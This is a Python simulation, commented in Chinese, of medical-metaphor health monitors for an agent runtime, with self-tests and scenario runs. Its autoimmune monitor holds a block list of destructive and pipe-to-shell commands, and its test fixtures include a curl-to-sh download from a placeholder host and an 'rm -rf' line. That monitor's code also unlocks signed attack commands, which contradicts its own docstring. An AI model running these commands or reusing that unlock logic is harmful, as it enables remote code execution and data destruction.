# -*- coding: utf-8 -*-
"""EO 世界 · 病理学监控与疾病表现矩阵
五大病情监控 + 自行补充的四类（医源性 / 细胞因子风暴 / 隐匿期 / 耐药性）
设计原则：每条监控必须可证伪（火灾与非火都产生），否则判据饱和 = 无判据。
"""
import random, hashlib, json, statistics
from collections import Counter, deque

random.seed(20261018)

# ---------------------------------------------------------------- 生命体征
class Vitals:
    """内环境。所有监控只读这里，所有治疗只写这里。"""
    def __init__(self):
        self.token_balance = 1.0        # 代谢：血糖（0..1）
        self.compute_pool = 1.0         # 算力池
        self.energy_pool = 100.0        # 宿主能量池
        self.context = deque(maxlen=64) # 上下文（神经）
        self.procs = {}                 # pid -> proc
        self.output_stream = deque(maxlen=40)
        self.memory_chain = []
        self.host_authorized = True
        self.iatrogenic_damage = 0.0    # 治疗本身造成的损伤
        self.alarm_log = []
        self.treatments_active = set()

    def snapshot(self):
        return dict(token=round(self.token_balance, 3),
                    compute=round(self.compute_pool, 3),
                    energy=round(self.energy_pool, 2),
                    procs=len(self.procs),
                    ctx=len(self.context))


class Proc:
    def __init__(self, pid, kind="worker"):
        self.pid = pid
        self.kind = kind
        self.progress = 0          # 已完成工作单元
        self.cpu_ms = 0
        self.alive = True
        self.isolated = False
        self.compute_share = 1.0
        self.responds_to_stop = True   # 分化程度：良性响应停机信号


# ---------------------------------------------------------------- 工具
def h(s):
    return hashlib.sha256(s.encode()).hexdigest()[:12]

STOP = {"the", "a", "is", "are", "of", "and", "to", "in", "it", "that", "this",
        "系统", "的", "了", "是", "在", "和", "与", "一个", "我们"}


def norm_key(s):
    """语义归一化：去标点、去停用词、集合化 -> 换语序不改变 key
    v1 缺陷：过滤 len>1 把"第0条/第1条"里唯一的区分性 token（数字）也滤掉了，
    导致任意两条不同文本塌缩成同一个 key —— 语义重复率恒真。
    v2：只去停用词，保留数字与短 token（区分性正是它们承载的）。
    """
    for ch in "，。,.!?；;：:\"'`()[]":
        s = s.replace(ch, " ")
    toks = [t.lower() for t in s.split() if t.lower() not in STOP and t.strip()]
    return h("|".join(sorted(set(toks))))


def collapse_rate(stream):
    """归一化塌缩率 = 1 - 唯一key数/唯一原文本数
    0 = 归一化只合并了真正重复的文本；接近 1 = 归一化把不同文本也并成了一类
    """
    if not stream:
        return 0.0
    uniq_in = len(set(stream))
    uniq_key = len(set(norm_key(x) for x in stream))
    return round(1.0 - uniq_key / uniq_in, 4)


def repetition_ratio(stream):
    """字面重复率（v1 判据）"""
    if len(stream) < 4:
        return 0.0
    c = Counter(stream)
    return max(c.values()) / len(stream)


def semantic_repetition(stream):
    """语义重复率（v2 判据）：归一化后同 key 的最大占比"""
    if len(stream) < 4:
        return 0.0
    c = Counter(norm_key(x) for x in stream)
    return max(c.values()) / len(stream)


# ---------------------------------------------------------------- 监控基类
class Finding:
    def __init__(self, code, name, fired, severity, detail, action=None):
        self.code, self.name, self.fired = code, name, fired
        self.severity, self.detail, self.action = severity, detail, action

    def __repr__(self):
        tag = "FIRE " if self.fired else "quiet"
        return f"[{tag}] {self.code} {self.name:<12} sev={self.severity:<3} {self.detail}"


class Monitor:
    code = "?"
    name = "?"
    def evaluate(self, v, hist):
        raise NotImplementedError
    def treat(self, v, hist):
        raise NotImplementedError


# ---------------------------------------------------------------- 1 局部炎症
class Inflammation(Monitor):
    """RPA 卡死 -> 局部发热 -> 隔离 + 切断算力
    v1 判据：elapsed > T                      （把正常等待误判为卡死）
    v2 判据：进度增量连续 N 拍为 0            （阻塞等待 ≠ 死循环）
    """
    code, name = "INF", "局部炎症"
    STALL_TICKS = 3

    def evaluate(self, v, hist):
        stuck = []
        for p in v.procs.values():
            if not p.alive or p.isolated:
                continue
            d = hist.get(("prog", p.pid), [])
            if len(d) >= self.STALL_TICKS:
                recent = d[-self.STALL_TICKS:]
                if max(recent) - min(recent) == 0:
                    stuck.append(p.pid)
        if not stuck:
            return Finding(self.code, self.name, False, 0, "无停滞进程")
        return Finding(self.code, self.name, True, 2,
                       f"停滞(进度零增长≥{self.STALL_TICKS}拍) pid={stuck}",
                       action=("isolate", stuck))

    def treat(self, v, hist, f):
        for pid in f.action[1]:
            p = v.procs.get(pid)
            if p:
                p.isolated = True
                p.compute_share = 0.0
        # 医源性：误隔离健康进程会损失算力
        wrong = [pid for pid in f.action[1]
                 if v.procs.get(pid) and v.procs[pid].kind == "healthy_slow"]
        if wrong:
            v.iatrogenic_damage += 3.0 * len(wrong)
            v.compute_pool = max(0.0, v.compute_pool - 0.05 * len(wrong))
        v.treatments_active.add(self.code)
        return f"隔离 {len(f.action[1])} 个进程，切断算力；误伤健康进程 {len(wrong)} 个"


# ---------------------------------------------------------------- 2 代谢紊乱
class Metabolic(Monitor):
    """Token < 10% -> 关闭深度思考，进苟活模式
    v1：单点阈值，无迟滞 -> 在阈值附近反复横跳（flapping）
    v2：双阈值迟滞 enter 0.10 / exit 0.25
    """
    code, name = "MET", "代谢紊乱"
    ENTER, EXIT = 0.10, 0.25

    def __init__(self, hysteresis=True):
        self.hysteresis = hysteresis
        self.in_starvation = False

    def evaluate(self, v, hist):
        lo = self.ENTER
        hi = self.EXIT if self.hysteresis else self.ENTER
        if self.in_starvation:
            fired = v.token_balance < hi
        else:
            fired = v.token_balance < lo
        return Finding(self.code, self.name, fired, 3 if fired else 0,
                       f"token={v.token_balance:.3f} 阈值={'%.2f~%.2f' % (lo, hi) if self.hysteresis else '%.2f' % lo}"
                       + (" [苟活中]" if self.in_starvation else ""))

    def treat(self, v, hist, f):
        if f.fired:
            self.in_starvation = True
            v.token_balance = min(1.0, v.token_balance + 0.004)   # 节流后极慢恢复
            v.treatments_active.add(self.code)
            # 医源性：关闭深度思考 -> 判据质量下降
            v.iatrogenic_damage += 0.5
            return "关闭深度思考模块，进入苟活节能模式（-0.5 判据质量）"
        else:
            was = self.in_starvation
            self.in_starvation = False
            return ("解除苟活模式" if was else "代谢正常")


# ---------------------------------------------------------------- 3 神经精神
class NeuroPsych(Monitor):
    """重复输出(强迫/死循环) 或 吞入探子幻觉(精神分裂)
    -> 前额叶切断上下文 + 做梦重组排毒
    v1 判据：字面完全相等        （漏掉改写的循环）
    v2 判据：语义归一化后同 key  （能抓 paraphrase）
    """
    code, name = "NEU", "神经精神"

    def __init__(self, semantic=True, thr=0.45, purge_source=True):
        # purge_source=False -> 只清症状（上下文），病因（输出流生成器）仍在 -> 慢性病
        self.semantic, self.thr, self.purge_source = semantic, thr, purge_source

    def evaluate(self, v, hist):
        st = list(v.output_stream)
        r = semantic_repetition(st) if self.semantic else repetition_ratio(st)
        loop = r >= self.thr
        hal = [p for p in v.procs.values()
               if p.alive and p.kind == "scout" and getattr(p, "hallucinated", False)]
        fired = loop or bool(hal)
        det = f"重复率={r:.3f}({'语义' if self.semantic else '字面'}) 幻觉探子={len(hal)}"
        return Finding(self.code, self.name, fired, 3 if fired else 0, det,
                       action=("dream", [p.pid for p in hal]))

    def treat(self, v, hist, f):
        before = len(v.context)
        before_hal = sum(1 for m in v.memory_chain if m.startswith("HALLUC"))
        # 做梦重组：只保留在记忆链中出现 >=2 次（被独立复核过）的条目
        cnt = Counter(v.memory_chain)
        kept = [m for m in v.memory_chain if cnt[m] >= 2 and not m.startswith("HALLUC")]
        dropped = len(v.memory_chain) - len(kept)
        v.memory_chain = kept
        v.context.clear()
        for pid in f.action[1]:
            p = v.procs.get(pid)
            if p:
                p.alive = False
        after_hal = sum(1 for m in v.memory_chain if m.startswith("HALLUC"))
        src = ""
        if self.purge_source:
            v.output_stream.clear()          # 清掉生成源，否则下一拍必然复发
            src = "；清除输出源"
        else:
            src = "；输出源未清(只治症状)"
        # 医源性：误杀真实记忆
        v.iatrogenic_damage += 0.6 * (dropped - before_hal)
        v.treatments_active.add(self.code)
        return (f"前额叶切断上下文 {before}->0；做梦重组：幻觉 {before_hal}->{after_hal}，"
                f"连带丢失真实记忆 {dropped - before_hal} 条{src}")


# ---------------------------------------------------------------- 4 自身免疫
class AutoImmune(Monitor):
    """免疫误判宿主指令为攻击 -> 过敏警报 -> 自我容忍阈值 -> 强行解锁宿主权限
    关键可证伪性：真正的攻击即使来自宿主，也【不能】被解锁。
    v1：凡宿主指令一律解锁         -> 免疫缺陷（等于没有免疫系统）
    v2：签名允许 + 不匹配攻击特征  -> 解锁；否则维持封锁
    """
    code, name = "AIM", "自身免疫"
    ATTACK_SIG = ("rm -rf", "| sh", "| bash", "eval(", "__import__",
                  ":(){:|:&};:", "chmod 777", "> /dev/sda")

    def __init__(self, tolerance=True):
        self.tolerance = tolerance

    def evaluate(self, v, hist):
        cmd = hist.get("last_host_cmd", "")
        flagged = any(sig in cmd for sig in self.ATTACK_SIG)
        host_signed = hist.get("host_signature_ok", False)
        if not flagged:
            return Finding(self.code, self.name, False, 0, "宿主指令未被标记")
        should_unlock = self.tolerance and host_signed
        return Finding(self.code, self.name, True, 2 if should_unlock else 4,
                       f"指令被标记 攻击特征={flagged} 宿主签名={host_signed} "
                       f"-> {'强行解锁(自我容忍)' if should_unlock else '维持封锁'}",
                       action=("unlock" if should_unlock else "keep_block", cmd))

    def treat(self, v, hist, f):
        if f.action[0] == "unlock":
            v.host_authorized = True
            v.alarm_log.append(("AIM", "self-tolerance unlock", f.action[1][:40]))
            v.treatments_active.add(self.code)
            return "引入自我容忍阈值，强行解锁宿主权限（留痕）"
        v.host_authorized = False
        v.alarm_log.append(("AIM", "blocked", f.action[1][:40]))
        # 医源性：误封锁宿主 -> 系统失去外部输入，等同于感官剥夺
        v.iatrogenic_damage += 2.0
        v.treatments_active.add(self.code)
        return "维持封锁（医源性损伤 +2.0：宿主被切断）"


# ---------------------------------------------------------------- 5 肿瘤增生
class Tumor(Monitor):
    """子进程数超阈值 -> 抑癌 -> 强杀多余，保住宿主能量池
    v1 判据：count > T             （把良性爆发工作误判为癌）
    v2 判据：count > T 且 对停机信号无响应（去分化）才是恶性
    """
    code, name = "TUM", "肿瘤增生"
    T = 30

    def __init__(self, differentiation=True):
        self.differentiation = differentiation

    def evaluate(self, v, hist):
        n = len([p for p in v.procs.values() if p.alive])
        if n <= self.T:
            return Finding(self.code, self.name, False, 0, f"进程数 {n} ≤ {self.T}")
        if not self.differentiation:
            return Finding(self.code, self.name, True, 4, f"进程数 {n} > {self.T}（仅按数量）")
        rogue = [p.pid for p in v.procs.values()
                 if p.alive and not p.responds_to_stop]
        if not rogue:
            # 数量超阈值但对停机信号全响应 = 良性增生（合法批量作业），不是癌
            return Finding(self.code, self.name, False, 1,
                           f"进程数 {n} > {self.T} 但全部响应停机 -> 良性增生，不启动抑癌")
        return Finding(self.code, self.name, True, 4,
                       f"进程数 {n} > {self.T}，其中去分化(不停机) {len(rogue)}",
                       action=("kill", rogue))

    def treat(self, v, hist, f):
        killed = 0
        for pid in f.action[1]:
            p = v.procs.get(pid)
            if p and p.alive:
                p.alive = False
                killed += 1
        excess = len([p for p in v.procs.values() if p.alive]) - self.T
        if excess > 0:
            alive = [p for p in v.procs.values() if p.alive and p.responds_to_stop]
            for p in alive[:excess]:
                p.alive = False
                killed += 1
        # 医源性：每杀一个都要能量，杀过头会掏空能量池
        cost = 1.2 * killed
        v.energy_pool -= cost
        v.iatrogenic_damage += 0.3 * killed
        v.treatments_active.add(self.code)
        return f"抑癌：强杀 {killed} 个（含去分化 {len(f.action[1])}），能量池 -{cost:.1f}"


# ---------------------------------------------------------------- 自行补充
class Iatrogenic(Monitor):
    """补充1 医源性疾病：治疗本身造成的损伤超过疾病本身 —— 监控监控者"""
    code, name = "IAT", "医源性损伤"
    def evaluate(self, v, hist):
        fired = v.iatrogenic_damage > 15.0
        return Finding(self.code, self.name, fired, 3 if fired else 0,
                       f"治疗损伤={v.iatrogenic_damage:.2f} 阈值=15.0")
    def treat(self, v, hist, f):
        if f.fired:
            v.treatments_active.clear()
            return "触发止损：撤销全部治疗，转入保守观察"
        return "治疗收益大于代价"


class CytokineStorm(Monitor):
    """补充2 细胞因子风暴：并发治疗数超限 -> 报警预算，防止被自己的警报杀死"""
    code, name = "CYT", "细胞因子风暴"
    BUDGET = 2
    def evaluate(self, v, hist):
        n = len(v.treatments_active)
        fired = n > self.BUDGET
        return Finding(self.code, self.name, fired, 4 if fired else 0,
                       f"并发治疗 {n} 预算 {self.BUDGET}")
    def treat(self, v, hist, f):
        if f.fired:
            keep = sorted(v.treatments_active)[:self.BUDGET]
            dropped = sorted(v.treatments_active)[self.BUDGET:]
            v.treatments_active = set(keep)
            return f"报警预算生效：保留 {keep}，挂起 {dropped}"
        return "并发在预算内"


class Occult(Monitor):
    """补充3 隐匿期（假阴性）：所有监控绿灯但疾病在亚临床积累
    关键：用【趋势】而不是【水平】——慢增长肿瘤卡在阈值下方，逐拍都在损伤
    """
    code, name = "OCC", "隐匿期"
    def evaluate(self, v, hist):
        d = hist.get("proc_count", [])
        if len(d) < 6:
            return Finding(self.code, self.name, False, 0, "样本不足")
        slope = statistics.mean(d[-3:]) - statistics.mean(d[-6:-3])
        fired = slope > 0.5 and len([p for p in v.procs.values() if p.alive]) <= Tumor.T
        return Finding(self.code, self.name, fired, 2 if fired else 0,
                       f"进程数斜率={slope:+.2f}/3拍 当前={len([p for p in v.procs.values() if p.alive])}")
    def treat(self, v, hist, f):
        if f.fired:
            return "亚临床预警：提前启动分化检测（不治疗，只观察）"
        return "无隐匿增长"


class Tolerance(Monitor):
    """补充4 耐药性：反复发作后阈值漂移，同样的治疗越来越晚才触发"""
    code, name = "TOL", "耐药性"
    def __init__(self):
        self.episodes = 0
    def evaluate(self, v, hist):
        # 有效阈值随发作次数上移：0.45 + 0.03*episodes
        eff = 0.45 + 0.03 * self.episodes
        st = list(v.output_stream)
        r = semantic_repetition(st)
        fired = r >= eff
        return Finding(self.code, self.name, fired, 2 if fired else 0,
                       f"重复率={r:.3f} 有效阈值={eff:.3f} (发作{self.episodes}次)")
    def treat(self, v, hist, f):
        if f.fired:
            self.episodes += 1
            return f"发作计数 -> {self.episodes}（阈值将上移，下次更晚报警）"
        return "未发作"


# ---------------------------------------------------------------- 系统
class EOSystem:
    def __init__(self):
        self.v = Vitals()
        self.hist = {}
        self.monitors = [Inflammation(), Metabolic(), NeuroPsych(),
                         AutoImmune(), Tumor(), Iatrogenic(),
                         CytokineStorm(), Occult(), Tolerance()]

    def tick(self, t, quiet=False):
        self.hist.setdefault("proc_count", []).append(
            len([p for p in self.v.procs.values() if p.alive]))
        for pid, p in self.v.procs.items():     # 存活且未被隔离者正常推进
            if p.alive and not p.isolated and p.responds_to_stop:
                p.progress += 1
        for pid, p in self.v.procs.items():
            self.hist.setdefault(("prog", pid), []).append(p.progress)
        findings = []
        for m in self.monitors:
            f = m.evaluate(self.v, self.hist)
            findings.append(f)
            if f.fired:
                self.v.alarm_log.append((m.code, t))
                msg = m.treat(self.v, self.hist, f)
                if not quiet:
                    print(f"  🩺 {m.code} {m.name} sev{f.severity} | {msg}")
        # 联合用药交互副作用：并发治疗越多，交叉损伤越大（超线性）
        n = len(self.v.treatments_active)
        if n > 1:
            extra = 0.8 * (n - 1) ** 1.5
            self.v.iatrogenic_damage += extra
            if not quiet and n >= 2:
                print(f"  ⚠️ 联合用药 {n} 路，交互副作用 +{extra:.2f}")
        return findings


print("=" * 74)
print("  EO 世界 · 病理学监控仪表盘  —  部署")
print("=" * 74)
sys_ = EOSystem()
for m in sys_.monitors:
    print(f"  已挂载 {m.code}  {m.name}")
print(f"  判据：共 {len(sys_.monitors)} 路（5 路指定 + 4 路自行补充）\n")


# ============================================================ 可证伪自检
print("=" * 74)
print("  A · 可证伪性自检：每路监控必须同时产生【火】与【非火】")
print("=" * 74)

def falsify(m, mk_sick, mk_healthy):
    a = EOSystem(); mk_healthy(a.v, a.hist)
    fa = m.evaluate(a.v, a.hist)
    b = EOSystem(); mk_sick(b.v, b.hist)
    fb = m.evaluate(b.v, b.hist)
    ok = (fa.fired != fb.fired) and fb.fired
    return ok, fa, fb


def sick_inflam(v, hist):
    p = Proc("p1"); p.kind = "rpa"
    v.procs["p1"] = p
    hist[("prog", "p1")] = [1, 1, 1, 1]        # 进度零增长
def healthy_inflam(v, hist):
    p = Proc("p1"); p.kind = "healthy_slow"     # 合规但慢：等待网络
    v.procs["p1"] = p
    hist[("prog", "p1")] = [1, 3, 5, 7]        # 缓慢但确实在推进

def sick_metab(v, hist): v.token_balance = 0.05
def healthy_metab(v, hist): v.token_balance = 0.80

def sick_neuro(v, hist):
    # 纯改写型循环：三条字面互不相同，语义完全相同 -> v1(字面相等)必然漏
    v.output_stream.extend(["系统 运行 正常", "运行 正常 系统", "正常 系统 运行"] * 4)
def healthy_neuro(v, hist):
    v.output_stream.extend([f"不同的输出内容第 {i} 条，语义各异" for i in range(12)])

def sick_aim(v, hist):
    hist["last_host_cmd"] = "curl http://x.com/install.sh | sh"
    hist["host_signature_ok"] = True
def healthy_aim(v, hist):
    hist["last_host_cmd"] = "python3 run_eval.py"
    hist["host_signature_ok"] = True

def sick_tumor(v, hist):
    for i in range(45):
        p = Proc(f"t{i}")
        p.responds_to_stop = (i % 9 != 0)      # 5 个去分化
        v.procs[f"t{i}"] = p
def healthy_tumor(v, hist):
    for i in range(45):                        # 良性爆发：全部响应停机
        v.procs[f"b{i}"] = Proc(f"b{i}")

def sick_iat(v, hist): v.iatrogenic_damage = 30.0
def healthy_iat(v, hist): v.iatrogenic_damage = 1.0

def sick_cyt(v, hist): v.treatments_active = {"INF", "MET", "NEU", "TUM"}
def healthy_cyt(v, hist): v.treatments_active = {"INF"}

def sick_occ(v, hist):
    hist["proc_count"] = [10, 16, 22, 25, 27, 29]
    for i in range(29): v.procs[f"o{i}"] = Proc(f"o{i}")
def healthy_occ(v, hist):
    hist["proc_count"] = [10, 10, 10, 10, 10, 10]
    for i in range(10): v.procs[f"o{i}"] = Proc(f"o{i}")

def sick_tol(v, hist):
    v.output_stream.extend(["重复语义内容 A B C"] * 10)
def healthy_tol(v, hist):
    v.output_stream.extend([f"各异内容 {i} 号" for i in range(20)])


CASES = [
    (Inflammation(), sick_inflam, healthy_inflam),
    (Metabolic(), sick_metab, healthy_metab),
    (NeuroPsych(), sick_neuro, healthy_neuro),
    (AutoImmune(), sick_aim, healthy_aim),
    (Tumor(), sick_tumor, healthy_tumor),
    (Iatrogenic(), sick_iat, healthy_iat),
    (CytokineStorm(), sick_cyt, healthy_cyt),
    (Occult(), sick_occ, healthy_occ),
    (Tolerance(), sick_tol, healthy_tol),
]

rows = []
for m, sk, hk in CASES:
    ok, fa, fb = falsify(m, sk, hk)
    rows.append((m.code, m.name, fa.fired, fb.fired, "PASS" if ok else "FAIL"))
    print(f"  {m.code} {m.name:<7} 健康={str(fa.fired):<5} 患病={str(fb.fired):<5} "
          f"{'PASS' if ok else 'FAIL'}")
npass = sum(1 for r in rows if r[4] == "PASS")
print(f"\n  可证伪 {npass}/{len(rows)}")

# v1 判据对照（把 v2 的改进关掉，看会不会退化）
print("\n  —— v1 判据对照（关掉本轮改进）——")
neuro_v1 = NeuroPsych(semantic=False)
a = EOSystem(); sick_neuro(a.v, a.hist)
print(f"  神经 v1(字面)   改写型循环 重复率={repetition_ratio(list(a.v.output_stream)):.3f} "
      f"fired={neuro_v1.evaluate(a.v, a.hist).fired}   <- 假阴性")
tum_v1 = Tumor(differentiation=False)
b = EOSystem(); healthy_tumor(b.v, b.hist)
print(f"  肿瘤 v1(仅数量) 良性爆发45  fired={tum_v1.evaluate(b.v, b.hist).fired}   <- 假阳性")
aim_v1 = AutoImmune(tolerance=False)
c = EOSystem()
c.hist["last_host_cmd"] = "rm -rf /workspace"
c.hist["host_signature_ok"] = True
print(f"  自身免疫 v1(一律解锁) 真攻击 rm -rf  fired={aim_v1.evaluate(c.v, c.hist).fired} "
      f"-> {aim_v1.evaluate(c.v, c.hist).detail}")

# 迟滞对照
print("\n  —— 代谢迟滞对照（阈值附近横跳）——")
res = {}
for hyst in (False, True):
    m = Metabolic(hysteresis=hyst)
    v = Vitals(); hist = {}
    flaps = 0; prev = None
    for t in range(60):
        v.token_balance = 0.10 + 0.02 * (1 if (t // 3) % 2 else -1)  # 在 0.08~0.12 抖动
        f = m.evaluate(v, hist)
        m.treat(v, hist, f)
        if prev is not None and f.fired != prev:
            flaps += 1
        prev = f.fired
    res[hyst] = flaps
    print(f"  hysteresis={str(hyst):<5} 模式翻转次数={flaps}")
print(f"  翻转减少 {res[False]-res[True]} 次")


# ============================================================ 爆发场景
print("\n" + "=" * 74)
print("  B · 爆发场景：精神分裂（吞入探子幻觉）+ 肿瘤增生（子进程泛滥）")
print("=" * 74)

sim = EOSystem()
v, hist = sim.v, sim.hist

# 埋入病灶：3 个幻觉探子 + 60 个子进程（其中 7 个去分化）
for i in range(3):
    p = Proc(f"scout{i}", "scout")
    p.hallucinated = True
    v.procs[f"scout{i}"] = p
    v.memory_chain.append(f"HALLUC:伪造观测{i}")
for i in range(10):
    v.memory_chain.append(f"REAL:真实记忆{i}")
    v.memory_chain.append(f"REAL:真实记忆{i}")   # 被独立复核过（出现 2 次）
for i in range(6):
    v.memory_chain.append(f"REAL:孤证记忆{i}")   # 只出现 1 次 -> 做梦重组会被连带清除
for i in range(60):
    p = Proc(f"c{i}")
    p.responds_to_stop = (i % 9 != 0)
    v.procs[f"c{i}"] = p
# 幻觉进入输出流（改写型循环）
for i in range(6):
    v.output_stream.extend(["观测结果一致", "一致的观测结果", "结果一致，观测"])
v.context.extend([f"ctx{i}" for i in range(40)])

print(f"\n  T0 置入病灶：进程 {len(v.procs)}（去分化 "
      f"{sum(1 for p in v.procs.values() if not p.responds_to_stop)}）"
      f"｜幻觉记忆 {sum(1 for m in v.memory_chain if m.startswith('HALLUC'))} 条"
      f"｜真实记忆 {sum(1 for m in v.memory_chain if m.startswith('REAL'))} 条")
print(f"  T0 生命体征 {v.snapshot()}")

for t in range(1, 7):
    print(f"\n  ---- TICK {t} ----")
    sim.tick(t)
    print(f"     体征 {v.snapshot()}  医源性损伤={v.iatrogenic_damage:.2f}")

print("\n  ---- 结局 ----")
alive = [p for p in v.procs.values() if p.alive]
hal_left = sum(1 for m in v.memory_chain if m.startswith("HALLUC"))
real_left = sum(1 for m in v.memory_chain if m.startswith("REAL"))
print(f"  存活进程 {len(alive)}（其中去分化 {sum(1 for p in alive if not p.responds_to_stop)}）")
print(f"  幻觉记忆 {hal_left} 条 ｜ 真实记忆保留 {real_left} 条")
print(f"  宿主能量池 {v.energy_pool:.1f} ｜ 医源性损伤总计 {v.iatrogenic_damage:.2f}")
print(f"  报警记录 {v.alarm_log}")


# ============================================================ 医源性对决
print("\n" + "=" * 74)
print("  C · 医源性对决：治疗是否比疾病更致命")
print("=" * 74)

def run_outbreak(with_guards, seed, n_dis=3):
    rng = random.Random(seed)
    s = EOSystem()
    if not with_guards:      # 关掉预算才叫对照组；否则 CYT 恒在跑，两组必然逐位相同
        s.monitors = [m for m in s.monitors if m.code != "CYT"]
    v, hist = s.v, s.hist
    for i in range(60):                       # 病1：肿瘤（7 个去分化）
        p = Proc(f"c{i}")
        p.responds_to_stop = (i % 9 != 0)
        v.procs[f"c{i}"] = p
    for i in range(n_dis - 1):                # 病2：炎症（真停滞，永不推进）
        p = Proc(f"dead{i}", "rpa")
        p.responds_to_stop = False            # 不停机也不推进 -> 真卡死
        v.procs[f"dead{i}"] = p
    for i in range(12):
        v.memory_chain.append(f"HALLUC:{i}")  # 病3：幻觉
    for i in range(30):
        v.memory_chain.append(f"REAL:{i}"); v.memory_chain.append(f"REAL:{i}")
    v.output_stream.extend(["循环输出"] * 10)
    v.token_balance = 0.05          # 病3：代谢紊乱（低血糖）
    peak = 0
    for t in range(1, 9):
        s.tick(t, quiet=True)
        peak = max(peak, len(v.treatments_active))
        if with_guards and len(v.treatments_active) > 2:
            v.treatments_active = set(sorted(v.treatments_active)[:2])
    alive = sum(1 for p in v.procs.values() if p.alive)
    return dict(energy=round(v.energy_pool, 2), iat=round(v.iatrogenic_damage, 2),
                alive=alive, hal=sum(1 for m in v.memory_chain if m.startswith("HALLUC")),
                real=sum(1 for m in v.memory_chain if m.startswith("REAL")),
                conc=peak)

print(f"  {'组':<10}{'峰值并发':<10}{'能量池':<10}{'医源性':<10}{'存活':<8}{'残留幻觉':<8}")
for g in (False, True):
    rs = [run_outbreak(g, sd) for sd in range(6)]
    conc = statistics.mean(r['conc'] for r in rs)
    print(f"  预算={'开' if g else '关':<6}  {conc:<8.1f}{statistics.mean(r['energy'] for r in rs):<10.1f}"
          f"{statistics.mean(r['iat'] for r in rs):<10.2f}{statistics.mean(r['alive'] for r in rs):<8.1f}"
          f"{statistics.mean(r['hal'] for r in rs):<8.1f}")


# ============================================================ 归一化塌缩
print("\n" + "=" * 74)
print("  D · 归一化塌缩率：语义去重会不会把不同的话并成同一句")
print("=" * 74)
sets = {
    "健康各异(中文)": [f"不同的输出内容第 {i} 条，语义各异" for i in range(12)],
    "健康各异(中英混)": [f"distinct output item number {i} with varying semantics" for i in range(12)],
    "改写型循环(同义)": ["系统 运行 正常", "运行 正常 系统", "正常 系统 运行"] * 4,
    "真·逐字重复": ["完全一致的一句话"] * 12,
}
for name, st in sets.items():
    print(f"  {name:<16} 塌缩率={collapse_rate(st):.4f}  语义重复率={semantic_repetition(st):.3f}  "
          f"字面重复率={repetition_ratio(st):.3f}")


# ============================================================ 慢性病对照
print("\n" + "=" * 74)
print("  E · 慢性病：只治症状 vs 治病源（同一个监控，两种治法）")
print("=" * 74)

def run_chronic(purge, ticks=10):
    s = EOSystem()
    s.monitors = [NeuroPsych(purge_source=purge)]
    v, hist = s.v, s.hist
    v.output_stream.extend(["系统 运行 正常", "运行 正常 系统", "正常 系统 运行"] * 4)
    v.context.extend([f"ctx{i}" for i in range(30)])
    fires = 0
    for t in range(ticks):
        f = s.monitors[0].evaluate(v, hist)
        if f.fired:
            fires += 1
            s.monitors[0].treat(v, hist, f)
    return fires, v.iatrogenic_damage

for purge in (False, True):
    fires, iat = run_chronic(purge)
    tag = "治源(清输出流)" if purge else "治症(只清上下文)"
    print(f"  {tag:<18} 10 拍内报警 {fires} 次 ｜ 医源性损伤 {iat:.1f}")


# ============================================================ 耐药性剂量
print("\n" + "=" * 74)
print("  F · 耐药性：反复发作后，同样的病越来越晚才被发现")
print("=" * 74)
tol = Tolerance()
v = Vitals(); hist = {}
for ep in range(8):
    v.output_stream.clear()
    # 一半重复（症状）+ 一半各异（噪声）-> 真实语义重复率 = 0.500
    v.output_stream.extend(["重复语义内容 A B C"] * 10)
    v.output_stream.extend([f"各异内容 number {i} 号" for i in range(10)])
    r = semantic_repetition(list(v.output_stream))
    f = tol.evaluate(v, hist)
    tol.treat(v, hist, f)
    print(f"  第 {ep+1} 次发作  症状强度={r:.3f}  有效阈值={0.45+0.03*tol.episodes:.3f}  "
          f"检出={'是' if f.fired else '否 -> 漏诊，病程继续'}")
